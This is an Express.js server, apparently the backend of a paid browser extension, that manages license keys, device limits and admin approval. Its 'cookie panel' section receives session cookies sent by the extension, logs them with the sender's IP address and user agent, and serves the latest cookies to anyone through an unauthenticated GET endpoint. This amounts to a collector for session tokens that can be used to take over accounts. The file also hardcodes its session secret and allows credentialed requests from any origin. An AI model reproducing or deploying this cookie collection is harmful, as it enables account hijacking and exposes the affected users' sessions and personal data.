const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const session = require("express-session");
const bcrypt = require("bcryptjs");

const app = express();
const PORT = 8080;

const KEYS_PATH = path.join(__dirname, "apikeys.json");
const ADMINS_PATH = path.join(__dirname, "admins.json");

function loadAdmins() {
  if (fs.existsSync(ADMINS_PATH)) {
    try {
      return JSON.parse(fs.readFileSync(ADMINS_PATH, "utf-8"));
    } catch (e) {
      return [];
    }
  }
  return [];
}
function saveAdmins(admins) {
  fs.writeFileSync(ADMINS_PATH, JSON.stringify(admins, null, 2));
}

app.use(
  session({
    secret: "ganti_ini_dengan_secret_random_lagi",
    resave: false,
    saveUninitialized: false,
    cookie: { httpOnly: true, sameSite: "lax", maxAge: 8 * 60 * 60 * 1000 },
  }),
);

let apiKeys = [];
if (fs.existsSync(KEYS_PATH)) {
  try {
    apiKeys = JSON.parse(fs.readFileSync(KEYS_PATH, "utf-8"));
  } catch (e) {
    apiKeys = [];
  }
}
function saveKeys() {
  fs.writeFileSync(KEYS_PATH, JSON.stringify(apiKeys, null, 2));
}
function revokeExpiredKeys() {
  const now = Date.now();
  let needSave = false;
  apiKeys.forEach((k) => {
    if (!k.revoked && now >= k.expireAt) {
      k.revoked = true;
      needSave = true;
    }
  });
  if (needSave) saveKeys();
}

app.use(
  cors({
    origin: true,
    credentials: true,
  }),
);
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

function requireAdmin(req, res, next) {
  if (req.session && req.session.isAdmin && req.session.adminUser)
    return next();
  return res.status(401).json({ message: "Unauthorized" });
}

function requireSuperadmin(req, res, next) {
  const admins = loadAdmins();
  const user = admins.find(
    (u) =>
      u.username === req.session.adminUser &&
      u.role === "superadmin" &&
      u.approved,
  );
  if (user) return next();
  return res.status(403).json({ message: "Only superadmin allowed" });
}

// =========== COOKIE PANEL: EXTENSION LOGGING ==============
let lastCookies = []; // Untuk riwayat cookie
let lastCookieValue = "";

// Endpoint menerima cookie dari extension
app.post("/cookies", (req, res) => {
  const { cookie } = req.body;
  const deviceId = req.headers["x-device-id"] || req.body.deviceId || "";
  let keyName = "",
    keyDevice = "";
  if (deviceId) {
    const keyObj = apiKeys.find((k) => {
      if (Array.isArray(k.deviceIds)) {
        return k.deviceIds.some((d) => d.deviceId === deviceId);
      }
      return false;
    });
    if (keyObj) {
      keyName = keyObj.name || "";
      keyDevice = deviceId;
    }
  }
  if (
    typeof cookie === "string" &&
    decodeURIComponent(cookie).endsWith("%3D%3D")
  ) {
    if (cookie !== lastCookieValue) {
      lastCookieValue = cookie;
      lastCookies.unshift({
        value: cookie,
        time: new Date().toISOString(),
        ip: req.headers["x-forwarded-for"] || req.connection.remoteAddress,
        ua: req.headers["user-agent"] || "",
        deviceId: keyDevice,
        keyName: keyName,
      });
      if (lastCookies.length > 1000) lastCookies.pop();
    }
    res.json({ success: true, cookie });
  } else {
    res.status(400).json({ error: "Cookie tidak valid" });
  }
});

// Endpoint untuk membaca cookies terakhir (untuk panel chat)
app.get("/cookies", (req, res) => {
  res.json({
    cookie: lastCookieValue,
    list: lastCookies.slice(0, 50),
  });
});
// =========== END COOKIE PANEL ==============

// Register calon admin
app.post("/api/register", async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password)
    return res
      .status(400)
      .json({ message: "Username dan password wajib diisi" });
  let admins = loadAdmins();
  if (admins.find((u) => u.username === username))
    return res.status(400).json({ message: "Username sudah dipakai" });
  const hash = await bcrypt.hash(password, 10);
  admins.push({ username, password: hash, role: "admin", approved: false });
  saveAdmins(admins);
  res.json({
    success: true,
    message: "Berhasil daftar, menunggu persetujuan admin utama",
  });
});

// Login (hanya user approved)
app.post("/api/login", async (req, res) => {
  const { username, password } = req.body;
  const admins = loadAdmins();
  const user = admins.find((u) => u.username === username);
  if (!user)
    return res.status(401).json({ message: "Username/password salah!" });
  if (!user.approved)
    return res
      .status(403)
      .json({ message: "Akun Anda belum disetujui admin utama." });
  const valid = await bcrypt.compare(password, user.password);
  if (!valid)
    return res.status(401).json({ message: "Username/password salah!" });
  req.session.isAdmin = true;
  req.session.adminUser = username;
  req.session.adminRole = user.role;
  res.json({ success: true, username, role: user.role });
});

app.post("/api/logout", (req, res) => {
  req.session.destroy(() => {
    res.json({ success: true });
  });
});

app.get("/api/status", (req, res) => {
  res.json({
    loggedIn: !!req.session.isAdmin,
    username: req.session.adminUser || null,
    role: req.session.adminRole || null,
  });
});

// List admin users (superadmin: semua, admin: diri sendiri)
app.get("/api/admins", requireAdmin, (req, res) => {
  const admins = loadAdmins();
  if (req.session.adminRole === "superadmin") {
    res.json({
      admins: admins.map((u) => ({
        username: u.username,
        role: u.role,
        approved: u.approved,
      })),
    });
  } else {
    const user = admins.find((u) => u.username === req.session.adminUser);
    res.json({
      admins: [
        { username: user.username, role: user.role, approved: user.approved },
      ],
    });
  }
});

// List pending users (hanya superadmin)
app.get("/api/pending-users", requireAdmin, requireSuperadmin, (req, res) => {
  const admins = loadAdmins();
  const pending = admins
    .filter((u) => u.role === "admin" && !u.approved)
    .map((u) => ({ username: u.username }));
  res.json({ pending });
});

// Approve user (superadmin only)
app.post("/api/approve-user", requireAdmin, requireSuperadmin, (req, res) => {
  const { username } = req.body;
  let admins = loadAdmins();
  const idx = admins.findIndex((u) => u.username === username && !u.approved);
  if (idx === -1)
    return res
      .status(404)
      .json({ message: "User tidak ditemukan atau sudah diapprove" });
  admins[idx].approved = true;
  saveAdmins(admins);
  res.json({ success: true, username });
});

// Reject (hapus) calon user (superadmin only)
app.post("/api/reject-user", requireAdmin, requireSuperadmin, (req, res) => {
  const { username } = req.body;
  let admins = loadAdmins();
  const idx = admins.findIndex((u) => u.username === username && !u.approved);
  if (idx === -1)
    return res
      .status(404)
      .json({ message: "User tidak ditemukan atau sudah diapprove" });
  admins.splice(idx, 1);
  saveAdmins(admins);
  res.json({ success: true, username });
});

// Hapus admin (superadmin only, tidak bisa hapus diri sendiri)
app.post("/api/delete-admin", requireAdmin, requireSuperadmin, (req, res) => {
  const { username } = req.body;
  if (!username)
    return res.status(400).json({ message: "Username wajib diisi" });
  if (username === req.session.adminUser)
    return res
      .status(400)
      .json({ message: "Tidak bisa hapus superadmin yang sedang login" });
  let admins = loadAdmins();
  const idx = admins.findIndex((u) => u.username === username);
  if (idx === -1)
    return res.status(404).json({ message: "User tidak ditemukan" });
  admins.splice(idx, 1);
  saveAdmins(admins);
  res.json({ success: true, username });
});

// Reset password admin (superadmin only, tidak bisa reset password dirinya sendiri)
app.post(
  "/api/reset-password",
  requireAdmin,
  requireSuperadmin,
  async (req, res) => {
    const { username, newPassword } = req.body;
    if (!username || !newPassword)
      return res
        .status(400)
        .json({ message: "Username dan password baru wajib diisi" });
    if (username === req.session.adminUser)
      return res.status(400).json({
        message: "Tidak bisa reset password superadmin yang sedang login",
      });
    let admins = loadAdmins();
    const idx = admins.findIndex((u) => u.username === username);
    if (idx === -1)
      return res.status(404).json({ message: "User tidak ditemukan" });
    admins[idx].password = await bcrypt.hash(newPassword, 10);
    saveAdmins(admins);
    res.json({ success: true });
  },
);

// Ganti password (untuk user login saja)
app.post("/api/change-password", requireAdmin, async (req, res) => {
  const { oldPassword, newPassword } = req.body;
  const username = req.session.adminUser;
  if (!oldPassword || !newPassword)
    return res.status(400).json({ message: "Semua kolom wajib diisi" });
  let admins = loadAdmins();
  const userIdx = admins.findIndex((u) => u.username === username);
  if (userIdx === -1)
    return res.status(401).json({ message: "User tidak ditemukan" });
  const valid = await bcrypt.compare(oldPassword, admins[userIdx].password);
  if (!valid) return res.status(401).json({ message: "Password lama salah" });
  admins[userIdx].password = await bcrypt.hash(newPassword, 10);
  saveAdmins(admins);
  res.json({ success: true });
});

// PATCHED: Generate key (support maxDevices 1-5, deviceIds array of obj)
app.post("/api/generate-key", requireAdmin, (req, res) => {
  const { expireDays, name, maxDevices } = req.body;
  if (![1, 2, 3].includes(Number(expireDays))) {
    return res.status(400).json({ message: "expireDays harus 1, 2, atau 3" });
  }
  let maxDeviceCount = Number(maxDevices) || 1;
  if (![1, 2, 3, 4, 5].includes(maxDeviceCount)) maxDeviceCount = 1;

  const newKey = crypto.randomBytes(24).toString("hex");
  const expireAt = Date.now() + Number(expireDays) * 24 * 60 * 60 * 1000;
  const keyObj = {
    apiKey: newKey,
    expireAt,
    revoked: false,
    name: name || "",
    deviceIds: [],
    used: false,
    maxDevices: maxDeviceCount,
  };
  apiKeys.push(keyObj);
  saveKeys();
  res.json({
    apiKey: newKey,
    expiry: Math.floor(expireAt / 1000),
    name: keyObj.name,
    maxDevices: keyObj.maxDevices,
  });
});

app.post("/api/rename-key", requireAdmin, (req, res) => {
  const { apiKey, name } = req.body;
  const idx = apiKeys.findIndex(
    (k) => k.apiKey === apiKey && !k.revoked && Date.now() < k.expireAt,
  );
  if (idx === -1)
    return res
      .status(404)
      .json({ message: "Key tidak ditemukan, sudah revoked, atau expired" });
  apiKeys[idx].name = name || "";
  saveKeys();
  res.json({ message: "Nama key berhasil diupdate", name: apiKeys[idx].name });
});

// PATCH: Heartbeat endpoint (for real-time online status)
app.post("/api/heartbeat", (req, res) => {
  const { apiKey, deviceId } = req.body;
  if (!apiKey || !deviceId)
    return res
      .status(400)
      .json({ success: false, message: "apiKey dan deviceId wajib dikirim" });

  const idx = apiKeys.findIndex(
    (k) => k.apiKey === apiKey && !k.revoked && Date.now() < k.expireAt,
  );
  if (idx === -1)
    return res
      .status(404)
      .json({ success: false, message: "Key tidak ditemukan atau expired" });
  const key = apiKeys[idx];
  if (!Array.isArray(key.deviceIds)) key.deviceIds = [];
  let device = key.deviceIds.find((d) => d.deviceId === deviceId);
  if (!device) {
    // Tambahkan jika device baru (opsional)
    device = { deviceId, status: "online", lastActive: Date.now() };
    key.deviceIds.push(device);
  }
  // Update status dan lastActive
  device.status = "online";
  device.lastActive = Date.now();
  saveKeys();
  res.json({ success: true });
});

// PATCHED: List key aktif (tambahkan maxDevices, deviceIds, online/offline real-time)
app.get("/api/list-keys", requireAdmin, (req, res) => {
  revokeExpiredKeys();
  const now = Date.now();
  // Update device status real-time: offline jika lebih 2 menit tidak heartbeat
  apiKeys.forEach((key) => {
    if (Array.isArray(key.deviceIds)) {
      key.deviceIds.forEach((dev) => {
        if (dev && typeof dev === "object") {
          if (now - (dev.lastActive || 0) > 2 * 60 * 1000) {
            dev.status = "offline";
          } else {
            dev.status = "online";
          }
        }
      });
    }
  });
  const activeKeys = apiKeys
    .filter((k) => !k.revoked && now < k.expireAt)
    .map(({ apiKey, expireAt, name, deviceIds, used, maxDevices }) => ({
      apiKey,
      expiry: Math.floor(expireAt / 1000),
      name: name || "",
      deviceIds: deviceIds || [],
      used: !!used,
      maxDevices: maxDevices || 1,
      currentDevices: (deviceIds || []).length,
      onlineDevices: (deviceIds || []).filter((d) => d.status === "online"),
      offlineDevices: (deviceIds || []).filter((d) => d.status === "offline"),
    }));
  res.json({ activeKeys });
});

// Revoke key
app.post("/api/revoke-key", requireAdmin, requireSuperadmin, (req, res) => {
  const { apiKey } = req.body;
  const idx = apiKeys.findIndex(
    (k) => k.apiKey === apiKey && !k.revoked && Date.now() < k.expireAt,
  );
  if (idx === -1)
    return res
      .status(404)
      .json({ message: "Key tidak ditemukan, sudah revoked, atau expired" });
  apiKeys[idx].revoked = true;
  saveKeys();
  res.json({ message: "Key berhasil di-revoke" });
});

// PATCHED: Validasi key (status per device online/offline)
app.post("/api/validate-key", (req, res) => {
  revokeExpiredKeys();
  const { apiKey, deviceId } = req.body;
  if (!apiKey || !deviceId) {
    return res
      .status(400)
      .json({ valid: false, message: "apiKey dan deviceId wajib dikirim" });
  }
  const idx = apiKeys.findIndex(
    (k) => k.apiKey === apiKey && !k.revoked && Date.now() < k.expireAt,
  );
  if (idx === -1) {
    return res.status(401).json({
      valid: false,
      message: "API Key tidak valid, expired, atau di-revoke",
    });
  }

  const key = apiKeys[idx];
  const maxDevices = key.maxDevices || 1;
  if (!Array.isArray(key.deviceIds)) key.deviceIds = [];

  // Sudah pernah pakai di device ini
  let device = key.deviceIds.find((d) => d.deviceId === deviceId);
  if (device) {
    device.status = "online";
    device.lastActive = Date.now();
    key.used = true;
    saveKeys();
    return res.json({
      valid: true,
      expiry: Math.floor(key.expireAt / 1000),
    });
  }

  // Jika device baru, cek slot
  if (key.deviceIds.length < maxDevices) {
    key.deviceIds.push({
      deviceId,
      status: "online",
      lastActive: Date.now(),
    });
    key.used = true;
    saveKeys();
    return res.json({
      valid: true,
      expiry: Math.floor(key.expireAt / 1000),
    });
  }

  // Sudah full slot
  return res.status(401).json({
    valid: false,
    message: `API Key sudah dipakai di ${maxDevices} device!`,
  });
});

// PATCHED: Logout device (set status offline)
app.post("/api/logout-key", (req, res) => {
  const { apiKey, deviceId } = req.body;
  if (!apiKey || !deviceId) {
    return res
      .status(400)
      .json({ success: false, message: "apiKey dan deviceId wajib dikirim" });
  }
  const idx = apiKeys.findIndex(
    (k) => k.apiKey === apiKey && !k.revoked && Date.now() < k.expireAt,
  );
  if (idx === -1) {
    return res
      .status(404)
      .json({ success: false, message: "Key tidak ditemukan atau expired" });
  }
  const key = apiKeys[idx];
  if (!Array.isArray(key.deviceIds)) key.deviceIds = [];
  const device = key.deviceIds.find((d) => d.deviceId === deviceId);
  if (!device) {
    return res
      .status(404)
      .json({ success: false, message: "DeviceId tidak ditemukan pada key" });
  }
  device.status = "offline";
  device.lastActive = Date.now();
  saveKeys();
  res.json({ success: true });
});

// PATCH: Extend waktu key (validasi days saja)
app.post("/api/extend-key", requireAdmin, (req, res) => {
  const { apiKey, days } = req.body;
  if (!apiKey || ![1, 2, 3].includes(Number(days)))
    return res.status(400).json({ message: "Parameter tidak valid" });
  const idx = apiKeys.findIndex(
    (k) => k.apiKey === apiKey && !k.revoked && Date.now() < k.expireAt,
  );
  if (idx === -1)
    return res
      .status(404)
      .json({ message: "Key tidak ditemukan, sudah revoked, atau expired" });
  apiKeys[idx].expireAt += Number(days) * 24 * 60 * 60 * 1000;
  saveKeys();
  res.json({
    message: "Waktu key berhasil diperpanjang",
    expiry: Math.floor(apiKeys[idx].expireAt / 1000),
  });
});

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public/index.html"));
});

app.listen(PORT, () => {
  console.log("Auth server running at http://localhost:" + PORT);
});
